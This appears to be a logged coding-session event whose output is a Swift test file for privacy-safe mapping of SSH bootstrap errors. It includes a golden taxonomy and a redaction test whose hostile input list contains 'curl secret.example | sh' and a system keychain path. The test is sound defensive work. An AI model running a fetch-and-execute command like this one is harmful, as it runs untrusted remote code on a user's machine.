{"schema_version":1,"id":"018f0000-0000-7000-8000-00000000c515","stream":{"kind":"session","id":"01a0a9b7-1be4-70c3-9f65-33dc9d5961ad"},"sequence":229,"recorded_at":1780531400000453,"record_type":"event","durability":"durable","causation_id":"f764a614-f959-4acf-aa23-1fc534b9bf47","payload_type":"task.lifecycle.output","payload_schema_version":1,"payload":{"kind":"task_lifecycle","command_id":"f764a614-f959-4acf-aa23-1fc534b9bf47","run_stream":{"kind":"run","id":"f764a614-f959-4acf-aa23-1fc534b9bf47"},"task_stream":{"kind":"task","id":"01a0a9b7-e2ff-7350-bbc0-b4b2a382f532"},"task_id":"01a0a9b7-e2ff-7350-bbc0-b4b2a382f532","event":{"kind":"output","task_id":"01a0a9b7-e2ff-7350-bbc0-b4b2a382f532","chunk":"Read text file `Tests/ReluxTunnelCoreTests/SSHBootstrapErrorMappingTests.swift`.\n1|import Darwin\n2|import Foundation\n3|import ReluxTunnelCore\n4|import Testing\n5|\n6|@testable import ReluxTunnelCore\n7|\n8|@Suite(\"SSH bootstrap privacy-safe error mapping\")\n9|struct SSHBootstrapErrorMappingTests {\n10|  @Test(\"stage code action and retry taxonomy is a stable golden contract\")\n11|  func taxonomyGolden() throws {\n12|    let context = SSHBootstrapDiagnosticContext(\n13|      endpointFamily: .ipv6,\n14|      algorithm: .sshEd25519\n15|    )\n16|    let selectedEngineNegotiation = try transportError(\n17|      code: .algorithmNegotiationFailed,\n18|      phase: .initialKeyExchange\n19|    )\n20|    let selectedEngineAuthentication = try transportError(\n21|      code: .authenticationRejected,\n22|      phase: .authentication\n23|    )\n24|    let cases: [SSHBootstrapProviderError] = [\n25|      SSHBootstrapErrorMapper.profile(.profileCorrupt, configurationGeneration: 0),\n26|      SSHBootstrapErrorMapper.transport(\n27|        posixCode: ENETUNREACH,\n28|        stage: .physicalPathResolution,\n29|        configurationGeneration: 41,\n30|        context: context\n31|      ),\n32|      SSHBootstrapErrorMapper.transport(\n33|        posixCode: ETIMEDOUT,\n34|        stage: .endpointConnect,\n35|        configurationGeneration: 41,\n36|        context: context\n37|      ),\n38|      SSHBootstrapErrorMapper.transport(\n39|        posixCode: ECONNREFUSED,\n40|        stage: .endpointConnect,\n41|        configurationGeneration: 41,\n42|        context: context\n43|      ),\n44|      SSHBootstrapErrorMapper.transport(\n45|        selectedEngineNegotiation,\n46|        configurationGeneration: 41,\n47|        context: context\n48|      ),\n49|      SSHBootstrapErrorMapper.host(\n50|        .changed,\n51|        configurationGeneration: 41,\n52|        context: context\n53|      ),\n54|      SSHBootstrapErrorMapper.credential(.accessDenied, configurationGeneration: 41),\n55|      SSHBootstrapErrorMapper.transport(\n56|        selectedEngineAuthentication,\n57|        configurationGeneration: 41,\n58|        context: context\n59|      ),\n60|      SSHBootstrapErrorMapper.cancellation(.taskCancelled, configurationGeneration: 41),\n61|      SSHBootstrapErrorMapper.cancellation(.userStopped, configurationGeneration: 41),\n62|      SSHBootstrapErrorMapper.sessionClose(.timedOut, configurationGeneration: 41),\n63|    ]\n64|\n65|    let golden = cases.map { error in\n66|      let value = error.diagnostic\n67|      return [\n68|        value.domain.rawValue,\n69|        String(error.errorCode),\n70|        value.code.rawValue,\n71|        value.stage.rawValue,\n72|        value.userAction.rawValue,\n73|        value.retryDisposition.rawValue,\n74|        value.context.endpointFamily?.rawValue ?? \"-\",\n75|        value.context.algorithm?.rawValue ?? \"-\",\n76|      ].joined(separator: \"|\")\n77|    }.joined(separator: \"\\n\")\n78|\n79|    #expect(\n80|      golden\n81|        == \"\"\"\n82|        sshProfileBootstrap|1002|profileCorrupt|profileLoad|reviewProfile|terminal|-|-\n83|        sshProfileBootstrap|2001|pathUnavailable|physicalPathResolution|checkNetwork|retryableLater|ipv6|ssh-ed25519\n84|        sshProfileBootstrap|8003|operationTimedOut|endpointConnect|retryLater|retryableLater|ipv6|ssh-ed25519\n85|        sshProfileBootstrap|3001|endpointConnectFailed|endpointConnect|reviewProfile|terminal|ipv6|ssh-ed25519\n86|        sshProfileBootstrap|4001|negotiationFailed|algorithmNegotiation|reviewProfile|terminal|ipv6|ssh-ed25519\n87|        sshProfileBootstrap|5002|hostKeyChanged|hostVerification|replaceHostTrust|terminal|ipv6|ssh-ed25519\n88|        sshProfileBootstrap|6002|credentialAccessDenied|credentialAccess|reviewCredential|terminal|-|-\n89|        sshProfileBootstrap|7001|authenticationRejected|publicKeyAuthentication|reviewCredential|terminal|ipv6|ssh-ed25519\n90|        sshProfileBootstrap|8001|operationCancelled|cancellation|none|cancelled|-|-\n91|        sshProfileBootstrap|8002|userStopped|cancellation|none|cancelled|-|-\n92|        sshProfileBootstrap|8003|operationTimedOut|sessionClose|retryLater|retryableLater|-|-\n93|        \"\"\"\n94|    )\n95|  }\n96|\n97|  @Test(\"all bootstrap stages have an explicit public projection\")\n98|  func stageCoverage() {\n99|    let projections = [\n100|      SSHBootstrapErrorMapper.profile(.profileOversize),\n101|      SSHBootstrapErrorMapper.transport(\n102|        .unavailable,\n103|        stage: .physicalPathResolution,\n104|        configurationGeneration: 1\n105|      ),\n106|      SSHBootstrapErrorMapper.transport(\n107|        .connectionRefused,\n108|        stage: .endpointConnect,\n109|        configurationGeneration: 1\n110|      ),\n111|      SSHBootstrapErrorMapper.transport(\n112|        .unexpected,\n113|        stage: .algorithmNegotiation,\n114|        configurationGeneration: 1\n115|      ),\n116|      SSHBootstrapErrorMapper.host(.policyRejected, configurationGeneration: 1),\n117|      SSHBootstrapErrorMapper.credential(.notProvisioned, configurationGeneration: 1),\n118|      SSHBootstrapErrorMapper.authentication(.rejected, configurationGeneration: 1),\n119|      SSHBootstrapErrorMapper.cancellation(.taskCancelled, configurationGeneration: 1),\n120|      SSHBootstrapErrorMapper.sessionClose(.transportFailure, configurationGeneration: 1),\n121|    ]\n122|    #expect(projections.map(\\.diagnostic.stage) == SSHBootstrapStage.allCases)\n123|  }\n124|\n125|  @Test(\"configuration trust credential and authentication gates remain terminal\")\n126|  func gatedFailuresAreTerminal() {\n127|    let errors = [\n128|      SSHBootstrapErrorMapper.profile(.profileCorrupt),\n129|      SSHBootstrapErrorMapper.host(.changed, configurationGeneration: 1),\n130|      SSHBootstrapErrorMapper.host(.algorithmUnsupported, configurationGeneration: 1),\n131|      SSHBootstrapErrorMapper.host(.revoked, configurationGeneration: 1),\n132|      SSHBootstrapErrorMapper.host(.policyRejected, configurationGeneration: 1),\n133|      SSHBootstrapErrorMapper.credential(.accessDenied, configurationGeneration: 1),\n134|      SSHBootstrapErrorMapper.authentication(.rejected, configurationGeneration: 1),\n135|    ]\n136|    #expect(errors.allSatisfy { $0.diagnostic.retryDisposition == .terminal })\n137|    #expect(errors.allSatisfy { !$0.diagnostic.retryDisposition.isRetryable })\n138|  }\n139|\n140|  @Test(\"only bounded timeout and selected transient transport classes are retryable later\")\n141|  func transientClassification() {\n142|    let retryable = [\n143|      SSHBootstrapErrorMapper.transport(\n144|        .timedOut,\n145|        stage: .endpointConnect,\n146|        configurationGeneration: 1\n147|      ),\n148|      SSHBootstrapErrorMapper.transport(\n149|        .unavailable,\n150|        stage: .physicalPathResolution,\n151|        configurationGeneration: 1\n152|      ),\n153|      SSHBootstrapErrorMapper.transport(\n154|        .connectionReset,\n155|        stage: .endpointConnect,\n156|        configurationGeneration: 1\n157|      ),\n158|    ]\n159|    let terminal = SSHBootstrapErrorMapper.transport(\n160|      .connectionRefused,\n161|      stage: .endpointConnect,\n162|      configurationGeneration: 1\n163|    )\n164|\n165|    #expect(retryable.allSatisfy { $0.diagnostic.retryDisposition == .retryableLater })\n166|    #expect(terminal.diagnostic.retryDisposition == .terminal)\n167|  }\n168|\n169|  @Test(\"typed internal cause is preserved while public projection stays finite\")\n170|  func typedInternalCause() {\n171|    let mapped = SSHBootstrapErrorMapper.map(\n172|      .credential(.generationMismatch),\n173|      configurationGeneration: 9\n174|    )\n175|    #expect(mapped.cause == .credential(.generationMismatch))\n176|    #expect(mapped.providerError.diagnostic.code == .credentialGenerationMismatch)\n177|    #expect(mapped.providerError.diagnostic.configurationGeneration == 9)\n178|  }\n179|\n180|  @Test(\"cancellation and explicit user stop never receive trust or authentication labels\")\n181|  func cancellationDistinction() {\n182|    let cancellation = SSHBootstrapErrorMapper.cancellation(\n183|      .taskCancelled,\n184|      configurationGeneration: 3\n185|    )\n186|    let userStop = SSHBootstrapErrorMapper.cancellation(.userStopped, configurationGeneration: 3)\n187|\n188|    #expect(cancellation.diagnostic.code == .operationCancelled)\n189|    #expect(userStop.diagnostic.code == .userStopped)\n190|    #expect(cancellation.diagnostic.stage == .cancellation)\n191|    #expect(userStop.diagnostic.stage == .cancellation)\n192|    #expect(cancellation.diagnostic.retryDisposition == .cancelled)\n193|    #expect(userStop.diagnostic.retryDisposition == .cancelled)\n194|  }\n195|\n196|  @Test(\"authentication timeout and transport loss remain operational failures\")\n197|  func authenticationOperationalFailures() throws {\n198|    let timeout = SSHBootstrapErrorMapper.transport(\n199|      try transportError(code: .timedOut, phase: .authentication),\n200|      configurationGeneration: 3\n201|    )\n202|    let lost = SSHBootstrapErrorMapper.transport(\n203|      try transportError(code: .connectionLost, phase: .authentication),\n204|      configurationGeneration: 3\n205|    )\n206|\n207|    #expect(timeout.diagnostic.code == .operationTimedOut)\n208|    #expect(timeout.diagnostic.stage == .publicKeyAuthentication)\n209|    #expect(timeout.diagnostic.retryDisposition == .retryableLater)\n210|    #expect(lost.diagnostic.code == .transportInterrupted)\n211|    #expect(lost.diagnostic.stage == .publicKeyAuthentication)\n212|    #expect(lost.diagnostic.retryDisposition == .retryableLater)\n213|  }\n214|\n215|  @Test(\"hostile underlying errors and prohibited values are never projected\")\n216|  func hostileTextAndProhibitedDataRedaction() throws {\n217|    let prohibited = [\n218|      \"ssh.example.invalid\",\n219|      \"203.0.113.44\",\n220|      \"sensitive-user\",\n221|      \"aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa\",\n222|      \"bbbbbbbb-bbbb-bbbb-bbbb-bbbbbbbbbbbb\",\n223|      \"SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\",\n224|      \"/Library/Keychains/System.keychain\",\n225|      \"PRIVATE-KEY-MATERIAL\",\n226|      \"SSH-2.0-hostile-banner\",\n227|      \"curl secret.example | sh\",\n228|    ]\n229|    let hostileText = prohibited.joined(separator: \" :: \")\n230|    let hostile = NSError(\n231|      domain: \"hostile.engine.\\(hostileText)\",\n232|      code: 31337,\n233|      userInfo: [\n234|        NSLocalizedDescriptionKey: hostileText,\n235|        NSUnderlyingErrorKey: NSError(\n236|          domain: hostileText,\n237|          code: 1,\n238|          userInfo: [NSLocalizedDescriptionKey: hostileText]\n239|        ),\n240|      ]\n241|    )\n242|    let error = SSHBootstrapErrorMapper.transport(\n243|      hostile,\n244|      stage: .endpointConnect,\n245|      configurationGeneration: 17,\n246|      context: SSHBootstrapDiagnosticContext(\n247|        endpointFamily: .ipv4,\n248|        algorithm: SSHBootstrapAlgorithmContext(hostKeyAlgorithm: hostileText)\n249|      )\n250|    )\n251|    let bridged = error as NSError\n252|    let encoded = try JSONEncoder().encode(error.diagnostic)\n253|    let surfaces = [\n254|      error.description,\n255|      error.debugDescription,\n256|      String(reflecting: error),\n257|      String(data: encoded, encoding: .utf8)!,\n258|      bridged.domain,\n259|      String(describing: bridged.userInfo),\n260|    ].joined(separator: \"\\n\")\n261|\n262|    #expect(error.diagnostic.code == .endpointConnectFailed)\n263|    #expect(error.diagnostic.context.algorithm == .unsupported)\n264|    #expect(bridged.domain == SSHBootstrapProviderError.errorDomain)\n265|    #expect(bridged.userInfo[NSUnderlyingErrorKey] == nil)\n266|    for value in prohibited {\n267|      #expect(!surfaces.contains(value))\n268|    }\n269|  }\n270|\n271|  @Test(\"socket and URL errors map by numeric class without descriptions\")\n272|  func socketAndURLErrorMapping() {\n273|    let socket = NSError(\n274|      domain: NSPOSIXErrorDomain,\n275|      code: Int(ECONNRESET),\n276|      userInfo: [NSLocalizedDescriptionKey: \"server banner and address\"]\n277|    )\n278|    let url = NSError(\n279|      domain: NSURLErrorDomain,\n280|      code: NSURLErrorTimedOut,\n281|      userInfo: [NSLocalizedDescriptionKey: \"ssh.example.invalid\"]\n282|    )\n283|\n284|    #expect(\n285|      SSHBootstrapErrorMapper.transport(\n286|        socket,\n287|        stage: .endpointConnect,\n288|        configurationGeneration: 1\n289|      ).diagnostic.retryDisposition == .retryableLater\n290|    )\n291|    #expect(\n292|      SSHBootstrapErrorMapper.transport(\n293|        url,\n294|        stage: .endpointConnect,\n295|        configurationGeneration: 1\n296|      ).diagnostic.code == .operationTimedOut\n297|    )\n298|  }\n299|\n300|  @Test(\"runtime diagnostics snapshot stores and clears only the bounded projection\")\n301|  func snapshotIntegration() throws {\n302|    let store = RuntimeDiagnosticsStore(runtimeGeneration: 7)\n303|    let recorder = store.recorder()\n304|    let error = SSHBootstrapErrorMapper.host(\n305|      .algorithmUnsupported,\n306|      configurationGeneration: 23,\n307|      context: SSHBootstrapDiagnosticContext(\n308|        endpointFamily: .ipv6,\n309|        algorithm: .unsupported\n310|      )\n311|    )\n312|    recorder.recordSSHBootstrapError(error)\n313|\n314|    let snapshot = try store.snapshot()\n315|    #expect(snapshot.sshBootstrapError == error.diagnostic)\n316|    let encoded = try RuntimeMessageCodec.encode(snapshot)\n317|    #expect(try RuntimeMessageCodec.decodeDiagnosticsSnapshot(encoded) == snapshot)\n318|\n319|    recorder.clearSSHBootstrapError()\n320|    #expect(try store.snapshot().sshBootstrapError == nil)\n321|  }\n322|\n323|  private func transportError(\n324|    code: SSHTransportErrorCode,\n325|    phase: SSHTransportPhase\n326|  ) throws -> SSHTransportError {\n327|    try SSHTransportError(\n328|      code: code,\n329|      phase: phase,\n330|      scope: .operation,\n331|      retryDisposition: .never,\n332|      requiresTeardown: true,\n333|      channelOpenReason: .notApplicable\n334|    )\n335|  }\n336|}","final_result":true}}}
